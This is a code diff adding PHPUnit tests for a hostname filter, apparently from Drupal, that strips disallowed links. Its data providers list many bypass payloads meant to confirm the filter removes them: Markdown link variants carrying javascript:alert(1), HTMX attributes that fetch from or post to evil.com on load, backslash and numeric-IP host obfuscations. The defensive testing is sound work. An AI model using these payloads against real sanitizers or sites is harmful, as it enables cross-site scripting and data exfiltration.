@@ -222,6 +222,187 @@ class HostnameFilterTest extends UnitTestCase {
   }
 
   /**
+   * Tests Markdown links and images whose syntax a simple regex misses.
+   *
+   * Nested or escaped brackets in the link text, angle-bracket destinations,
+   * single-quoted or parenthesized titles and balanced parentheses are all
+   * rendered as links by CommonMark and showdown, so the URL must still be
+   * checked.
+   *
+   * @dataProvider markdownLinkSyntaxVariantProvider
+   */
+  public function testMarkdownLinkSyntaxVariantsAreFiltered(string $markdown, string $expected): void {
+    $this->hostnameFilter->setAllowedDomains(['example.com']);
+    $this->assertSame($expected, $this->hostnameFilter->filterText($markdown));
+  }
+
+  /**
+   * Provides Markdown link syntax variants with disallowed URLs.
+   *
+   * @return array<string, array{0: string, 1: string}>
+   *   Each case is [markdown payload, expected output].
+   */
+  public static function markdownLinkSyntaxVariantProvider(): array {
+    return [
+      'nested brackets + javascript' => ['[T[X]](javascript:alert(1))', 'T[X]'],
+      'nested brackets + host' => ['[T[X]](https://evil.com/x)', 'T[X]'],
+      'nested brackets image' => ['![a[b]](https://evil.com/p.png?d=1)', ''],
+      'escaped bracket' => ['[T\]](https://evil.com/x)', 'T\]'],
+      'angle brackets' => ['[T](<https://evil.com/x>)', 'T'],
+      'angle brackets + javascript' => ['[T](<javascript:alert(1)>)', 'T'],
+      'unclosed angle bracket' => ['[T](<https://evil.com/x)', 'T'],
+      'leading whitespace' => ['[T]( https://evil.com/x )', 'T'],
+      'space before parenthesis' => ['[T] (https://evil.com/x)', 'T'],
+      'single-quoted title' => ["[T](https://evil.com/x 'title')", 'T'],
+      'parenthesized title' => ['[T](https://evil.com/x (title))', 'T'],
+      'balanced parentheses' => ['[T](https://evil.com/a(b)c)', 'T'],
+      'multi-line text' => ["[T\nX](https://evil.com/x)", "T\nX"],
+      'escaped scheme colon' => ['[T](javascript\:alert(1))', 'T'],
+      'backslash host' => ['[T](/\evil.com/x)', 'T'],
+      'nested disallowed inner' => [
+        '[a [b](https://evil.com/1) c](https://example.com/2)',
+        '[a b c](https://example.com/2)',
+      ],
+      'nested disallowed outer' => [
+        '[a [b](https://example.com/1) c](https://evil.com/2)',
+        'a [b](https://example.com/1) c',
+      ],
+      'reference label with escaped bracket' => ["[r\\]x]: https://evil.com/x\n\n[r\\]x]", "\n\n[r\\]x]"],
+      'bracket in code span' => ['[x `]` y](javascript:alert(1))', '[x `]` y'],
+      'reference definition in list item' => ["[T][r]\n\n- [r]: https://evil.com/x", "[T][r]\n\n"],
+      'indented reference definition' => ["- a\n\n    [r]: https://evil.com/x", "- a\n\n"],
+    ];
+  }
+
+  /**
+   * Tests a "]" inside a code span, autolink or HTML tag does not hide a link.
+   *
+   * Renderers do not treat these brackets as link syntax, so the link text
+   * still ends at the next "]" and the destination must still be checked.
+   *
+   * @dataProvider markdownBracketInOtherSyntaxProvider
+   */
+  public function testMarkdownBracketInOtherSyntaxIsFiltered(string $markdown): void {
+    $this->hostnameFilter->setAllowedDomains(['example.com']);
+    $this->assertStringNotContainsString('evil.com', $this->hostnameFilter->filterText($markdown));
+  }
+
+  /**
+   * Provides link text holding a "]" that renderers do not treat as a bracket.
+   *
+   * @return array<string, array{0: string}>
+   *   Each case is [markdown payload].
+   */
+  public static function markdownBracketInOtherSyntaxProvider(): array {
+    return [
+      'code span' => ['[`a]`](https://evil.com/x)'],
+      'autolink' => ['[a <https://example.com/]> b](https://evil.com/x)'],
+      'html attribute' => ['[a <b title="]">](https://evil.com/x)'],
+    ];
+  }
+
+  /**
+   * Tests a "](url)" is checked even when no opening "[" is left to pair with.
+   *
+   * Whatever consumed the opener, a renderer may still link the "](url)", so
+   * the destination is checked and removed if it is not allowed.
+   *
+   * @dataProvider markdownUnpairedClosingBracketProvider
+   */
+  public function testMarkdownUnpairedClosingBracketIsFiltered(string $markdown): void {
+    $this->hostnameFilter->setAllowedDomains(['example.com']);
+    $result = $this->hostnameFilter->filterText($markdown);
+    $this->assertStringNotContainsString('javascript:', $result);
+    $this->assertStringNotContainsString('evil.com', $result);
+  }
+
+  /**
+   * Provides payloads where the opener is used up by other syntax.
+   *
+   * @return array<string, array{0: string}>
+   *   Each case is [markdown payload].
+   */
+  public static function markdownUnpairedClosingBracketProvider(): array {
+    return [
+      'multi-backtick code span' => ['[a ``]`` b](javascript:alert(1))'],
+      'html comment' => ['[a <!-- ] --> b](javascript:alert(1))'],
+      'processing instruction' => ['[a <?php ] ?> b](javascript:alert(1))'],
+      'cdata' => ['[a <![CDATA[ ]]> b](javascript:alert(1))'],
+      'image' => ['![x `]` y](javascript:alert(1))'],
+      'extra opener' => ['[[x `]` y](javascript:alert(1))'],
+      'link inside code span' => ['[a `](/ok)` b](javascript:alert(1))'],
+      'link inside html attribute' => ['[a <b title="](/ok)">](https://evil.com/x)'],
+      'backslash in code span' => ['[a `\` ](javascript:alert(1))`'],
+      'opener in html' => ['<a href="/x">[a</a>`]`](https://evil.com/x)'],
+    ];
+  }
+
+  /**
+   * Tests reference definitions inside containers are allowlist-checked.
+   *
+   * A definition may sit in a block quote, an ordered or nested list item or
+   * behind any indentation a container allows.
+   *
+   * @dataProvider markdownReferenceDefinitionInContainerProvider
+   */
+  public function testMarkdownReferenceDefinitionInContainerIsFiltered(string $markdown): void {
+    $this->hostnameFilter->setAllowedDomains(['example.com']);
+    $result = $this->hostnameFilter->filterText($markdown);
+    $this->assertStringNotContainsString('javascript:', $result);
+    $this->assertStringNotContainsString('evil.com', $result);
+  }
+
+  /**
+   * Provides reference definitions nested in Markdown containers.
+   *
+   * @return array<string, array{0: string}>
+   *   Each case is [markdown payload].
+   */
+  public static function markdownReferenceDefinitionInContainerProvider(): array {
+    return [
+      'block quote' => ["> [r]: https://evil.com/x\n\n[a][r]"],
+      'ordered list' => ["1. [r]: javascript:alert(1)\n\n[a][r]"],
+      'ordered list with parenthesis' => ["1) [r]: javascript:alert(1)\n\n[a][r]"],
+      'bullet list in block quote' => ["[a][r]\n\n> - [r]: javascript:alert(1)"],
+      'list item in list item' => ["- a\n  - [r]: https://evil.com/x\n\n[a][r]"],
+      'tab indented' => ["-\t[r]: https://evil.com/x\n\n[a][r]"],
+    ];
+  }
+
+  /**
+   * Tests a stray "]" or definition with an allowed URL is left untouched.
+   */
+  public function testMarkdownUnpairedBracketAndContainerDefinitionWithAllowedUrlsAreKept(): void {
+    $this->hostnameFilter->setAllowedDomains(['example.com']);
+    $this->loggerChannel->expects($this->never())->method('warning');
+    $markdown = "1] (see below) and a stray ](/node/1) or ](https://example.com/a)\n\n"
+      . "- [r]: https://example.com/x\n\n1. [s]: /node/2\n\n[a][r] [b][s]";
+    $this->assertSame($markdown, $this->hostnameFilter->filterText($markdown));
+  }
+
+  /**
+   * Tests allowed and non-link bracket syntax is left untouched.
+   */
+  public function testMarkdownBracketSyntaxWithAllowedUrlsIsKept(): void {
+    $this->hostnameFilter->setAllowedDomains(['example.com']);
+    $this->loggerChannel->expects($this->never())->method('warning');
+    $markdown = '[ok](https://example.com/a(b)c "t") [T[X]](https://example.com/y) '
+      . '![i](https://example.com/i.png) [a](#x) [b](/node/1) [note] (see below) [1] '
+      . '[`a]`](https://example.com/z)';
+    $this->assertSame($markdown, $this->hostnameFilter->filterText($markdown));
+  }
+
+  /**
+   * Tests rewrite mode never keeps a link with a hostless scheme.
+   */
+  public function testMarkdownRewriteDropsDangerousSchemes(): void {
+    $this->hostnameFilter->setAllowedDomains(['example.com']);
+    $this->hostnameFilter->setRewriteLinks(TRUE);
+    $result = $this->hostnameFilter->filterText('[x](javascript:alert(1)) [y[z]](https://evil.com/z)');
+    $this->assertSame('x [https://evil.com/z](https://evil.com/z)', $result);
+  }
+
+  /**
    * Test relative Markdown links are allowed.
    */
   public function testRelativeMarkdownLinksAreAllowed(): void {
@@ -1527,6 +1708,52 @@ TEXT;
   }
 
   /**
+   * Test that HTMX attributes are stripped.
+   *
+   * @dataProvider htmxAttributeProvider
+   */
+  public function testHtmxAttributesStripped(string $html, string $attribute): void {
+    $this->hostnameFilter->setAllowedDomains(['example.com']);
+    $result = $this->hostnameFilter->filterText($html);
+    $this->assertStringNotContainsStringIgnoringCase($attribute, $result);
+    $this->assertStringNotContainsString('alert(document.domain)', $result);
+    $this->assertStringNotContainsString('evil.com', $result);
+    $this->assertStringContainsString('Click me!', $result);
+  }
+
+  /**
+   * Data provider for testHtmxAttributesStripped().
+   */
+  public static function htmxAttributeProvider(): array {
+    return [
+      'data-hx-on' => [
+        '<a href="https://example.com" data-hx-on-click="alert(document.domain)">Click me!</a>',
+        'data-hx-on',
+      ],
+      'hx-on colon' => [
+        '<a href="https://example.com" hx-on:click="alert(document.domain)">Click me!</a>',
+        'hx-on',
+      ],
+      'hx-on uppercase' => [
+        '<div HX-ON:CLICK="alert(document.domain)">Click me!</div>',
+        'hx-on',
+      ],
+      'hx-get' => [
+        '<button hx-get="https://evil.com/payload" hx-trigger="load">Click me!</button>',
+        'hx-',
+      ],
+      'data-hx-post' => [
+        '<div data-hx-post="https://evil.com/steal" data-hx-trigger="load">Click me!</div>',
+        'data-hx-',
+      ],
+      'hx-vals js' => [
+        '<div hx-vals="js:{a: alert(document.domain)}">Click me!</div>',
+        'hx-vals',
+      ],
+    ];
+  }
+
+  /**
    * Test that style tags are removed entirely.
    */
   public function testStyleTagRemoved(): void {
@@ -1922,6 +2149,196 @@ TEXT;
       'javascript: with tab entity' => ['java&#9;script:alert(1)', 'script:alert(1)'],
       'data: with tab entity' => ['da&#9;ta:text/html,xss', 'ta:text/html,xss'],
       'vbscript: with tab entity' => ['vbs&#9;cript:MsgBox(1)', 'cript:MsgBox(1)'],
+    ];
+  }
+
+  /**
+   * Tests backslash host-relative URLs cannot bypass an empty allowlist.
+   *
+   * Browsers treat "\" as "/" in http(s) URLs, so "/\evil.com/x" resolves to
+   * "https://evil.com/x".
+   *
+   * @dataProvider backslashHostRelativeUrlProvider
+   */
+  public function testBackslashHostRelativeUrlBlocked(string $url): void {
+    $this->hostnameFilter->setAllowedDomains([]);
+    $markup = [
+      '<a href="' . $url . '">click</a>',
+      '<img src="' . $url . '">',
+      '<img srcset="' . $url . ' 2x">',
+      '[click](' . $url . ')',
+      '![img](' . $url . ')',
+    ];
+    foreach ($markup as $text) {
+      $result = $this->hostnameFilter->filterText($text);
+      $this->assertStringNotContainsString('evil.com', $result, $text);
+    }
+  }
+
+  /**
+   * Tests backslash host-relative URLs are removed in plain text mode.
+   *
+   * @dataProvider backslashHostRelativeUrlProvider
+   */
+  public function testBackslashHostRelativeUrlBlockedInPlainTextMode(string $url): void {
+    $this->hostnameFilter->setAllowedDomains([]);
+    $this->hostnameFilter->setPlainTextMode(TRUE);
+    $result = $this->hostnameFilter->filterText('See ' . $url . ' now');
+    $this->assertStringNotContainsString('evil.com', $result);
+  }
+
+  /**
+   * Data provider for backslash host-relative URLs.
+   */
+  public static function backslashHostRelativeUrlProvider(): array {
+    return [
+      'slash backslash' => ['/\evil.com/x'],
+      'backslash backslash' => ['\\\\evil.com/x'],
+      'backslash slash' => ['\/evil.com/x'],
+      'escaped slashes' => ['\/evil.com\/x'],
+      'https scheme with backslashes' => ['https:\\\\evil.com/x'],
+    ];
+  }
+
+  /**
+   * Tests backslash host-relative URLs to an allowed host are kept.
+   */
+  public function testBackslashHostRelativeUrlToAllowedHostKept(): void {
+    $this->hostnameFilter->setAllowedDomains(['example.com']);
+    $result = $this->hostnameFilter->filterText('<a href="/\example.com/x">click</a>');
+    $this->assertStringContainsString('href="/\example.com/x"', $result);
+  }
+
+  /**
+   * Tests a backslash inside a relative path is still allowed.
+   */
+  public function testBackslashInsideRelativePathAllowed(): void {
+    $this->hostnameFilter->setAllowedDomains([]);
+    $result = $this->hostnameFilter->filterText('<a href="/docs\page">click</a>');
+    $this->assertStringContainsString('href="/docs\page"', $result);
+  }
+
+  /**
+   * Tests escape sequences are untouched in plain text mode.
+   *
+   * Streamed chat and automators filter JSON, regular expressions and escaped
+   * strings in plain text mode; none of these are URLs.
+   *
+   * @dataProvider escapeSequenceProvider
+   */
+  public function testEscapeSequencesPreservedInPlainTextMode(string $text): void {
+    $this->hostnameFilter->setAllowedDomains(['www.drupal.org']);
+    $this->hostnameFilter->setPlainTextMode(TRUE);
+    $this->assertSame($text, $this->hostnameFilter->filterText($text));
+  }
+
+  /**
+   * Data provider for text containing escape sequences that are not URLs.
+   */
+  public static function escapeSequenceProvider(): array {
+    return [
+      'escaped newline' => ['Escape a newline as "\\\\n"'],
+      'regular expression' => ['Regex /\d+\/\w+/ here'],
+      'json path' => ['{"p":"\/node\/1"}'],
+      'json allowed host' => ['{"u":"https:\/\/www.drupal.org\/x"}'],
+      'allowed host with trailing punctuation' => ['See https://www.drupal.org/x.'],
+    ];
+  }
+
+  /**
+   * Tests JSON-escaped URLs to a disallowed host are still removed.
+   */
+  public function testJsonEscapedDisallowedUrlRemovedInPlainTextMode(): void {
+    $this->hostnameFilter->setAllowedDomains(['www.drupal.org']);
+    $this->hostnameFilter->setPlainTextMode(TRUE);
+    $result = $this->hostnameFilter->filterText('{"u":"https:\/\/evil.com\/x","p":"\/node\/1"}');
+    $this->assertStringNotContainsString('evil.com', $result);
+    $this->assertStringContainsString('"p":"\/node\/1"', $result);
+  }
+
+  /**
+   * Tests backslash host-relative URLs are removed in quoted contexts.
+   *
+   * The plain text pattern only starts a match at a boundary, so quotes and
+   * parentheses around the URL must not let it through.
+   *
+   * @dataProvider backslashHostRelativeUrlProvider
+   */
+  public function testBackslashHostRelativeUrlBlockedInQuotedContextInPlainTextMode(string $url): void {
+    $this->hostnameFilter->setAllowedDomains(['www.drupal.org']);
+    $this->hostnameFilter->setPlainTextMode(TRUE);
+    foreach (['<a href="' . $url . '">x</a>', '{"u":"' . $url . '"}', '[x](' . $url . ')'] as $text) {
+      $result = $this->hostnameFilter->filterText($text);
+      $this->assertStringNotContainsString('evil.com', $result, $text);
+    }
+  }
+
+  /**
+   * Tests an allowed host is kept when written with backslash separators.
+   */
+  public function testBackslashHostRelativeUrlToAllowedHostKeptInPlainTextMode(): void {
+    $this->hostnameFilter->setAllowedDomains(['www.drupal.org']);
+    $this->hostnameFilter->setPlainTextMode(TRUE);
+    $text = '{"u":"\/\/www.drupal.org\/x"}';
+    $this->assertSame($text, $this->hostnameFilter->filterText($text));
+  }
+
+  /**
+   * Tests extra slashes after an http(s) scheme cannot hide the host.
+   */
+  public function testExtraSlashesAfterSchemeBlocked(): void {
+    $this->hostnameFilter->setAllowedDomains([]);
+    $result = $this->hostnameFilter->filterText('<a href="https:////evil.com/x">click</a>');
+    $this->assertStringNotContainsString('evil.com', $result);
+  }
+
+  /**
+   * Tests hosts that bypass a dotted-name check are removed in plain text mode.
+   *
+   * @dataProvider plainTextObfuscatedHostProvider
+   */
+  public function testObfuscatedHostRemovedInPlainTextMode(string $url, string $marker): void {
+    $this->hostnameFilter->setAllowedDomains(['www.drupal.org']);
+    $this->hostnameFilter->setPlainTextMode(TRUE);
+    $result = $this->hostnameFilter->filterText('See ' . $url . ' now');
+    $this->assertStringNotContainsString($marker, $result, $url);
+  }
+
+  /**
+   * Data provider for testObfuscatedHostRemovedInPlainTextMode().
+   */
+  public static function plainTextObfuscatedHostProvider(): array {
+    return [
+      'uppercase scheme' => ['HTTPS://evil.com/x', 'evil.com'],
+      'uppercase scheme, integer IPv4' => ['HTTPS://1572395042/x', '1572395042'],
+      'other scheme' => ['ftp://evil.com/x', 'evil.com'],
+      'protocol-relative integer IPv4' => ['//1572395042/x', '1572395042'],
+      'protocol-relative hex IPv4' => ['//0x7f000001/x', '0x7f000001'],
+      'protocol-relative single label' => ['//evil/x', 'evil'],
+      'backslash integer IPv4' => ['/\\1572395042/x', '1572395042'],
+      'backslash IDN full stop' => ['/\\evil．com/x', 'evil'],
+    ];
+  }
+
+  /**
+   * Tests escape sequences are not mistaken for hosts in plain text mode.
+   *
+   * @dataProvider plainTextEscapeSequenceProvider
+   */
+  public function testEscapeSequencesKeptInPlainTextMode(string $text): void {
+    $this->hostnameFilter->setAllowedDomains(['www.drupal.org']);
+    $this->hostnameFilter->setPlainTextMode(TRUE);
+    $this->assertSame($text, $this->hostnameFilter->filterText($text));
+  }
+
+  /**
+   * Data provider for testEscapeSequencesKeptInPlainTextMode().
+   */
+  public static function plainTextEscapeSequenceProvider(): array {
+    return [
+      'back-references' => ['replace with \\\\1 and \\\\2'],
+      'newline escape' => ['line one\\\\nline two'],
+      'json path' => ['{"p":"\\/node\\/1"}'],
     ];
   }
 
